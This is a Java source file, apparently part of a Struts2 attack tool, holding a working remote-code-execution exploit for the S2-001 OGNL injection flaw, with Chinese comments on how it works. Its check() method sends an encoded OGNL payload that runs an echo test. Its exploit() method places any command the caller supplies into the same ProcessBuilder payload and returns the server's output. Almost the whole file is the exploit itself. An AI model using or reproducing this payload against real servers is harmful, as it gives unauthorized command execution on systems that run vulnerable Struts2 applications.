package Module;

import Framework.HTTPinterface;

/**
 * S2-001 远程代码执行漏洞
 *
 * 原理
 * 参考 http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html
 * 该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，
 * 然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，
 * 由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行
 */

public class S2_001_RCE {
    public static Boolean check(String url) {
        try {
            String result = HTTPinterface.POST(url,
                    "username=nokali&password=%25%7B%23a%3D%28new+java." +
                            "lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22" +
                            "echo%22%2C%22112233%22%7D%29%29.redirectErrorStream" +
                            "%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28" +
                            "%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C" +
                            "%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew" +
                            "+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context" +
                            ".get%28%22com.opensymphony.xwork2.dispatcher.HttpServlet" +
                            "Response%22%29%2C%23f.getWriter%28%29.println%28new+java." +
                            "lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28" +
                            "%29%2C%23f.getWriter%28%29.close%28%29%7D");
            if (result.contains("112233")) {
                return true;
            } else {
                return false;
            }
        } catch (Exception e) {
            return false;
        }
    }

    public static String exploit(String url,String cmd){
        try{
            String finalCmd=cmd.replace(" ","%22%2C%22");    //payload以数组形式构造出来，此处是将空格替换成","
            String result = HTTPinterface.POST(url,
                    "username=nokali&password=%25%7B%23a%3D%28new+java." +
                            "lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22" +
                            finalCmd+"%22%7D%29%29.redirectErrorStream" +
                            "%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28" +
                            "%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C" +
                            "%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew" +
                            "+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context" +
                            ".get%28%22com.opensymphony.xwork2.dispatcher.HttpServlet" +
                            "Response%22%29%2C%23f.getWriter%28%29.println%28new+java." +
                            "lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28" +
                            "%29%2C%23f.getWriter%28%29.close%28%29%7D");
            result = result.substring(result.indexOf("</tr>")).replace("</tr>","");    //去除多余输出，如果需要读取完整回显，注释该行即可
            return result;
        }catch (Exception e){
            return "[-]访问出错";
        }
    }
}
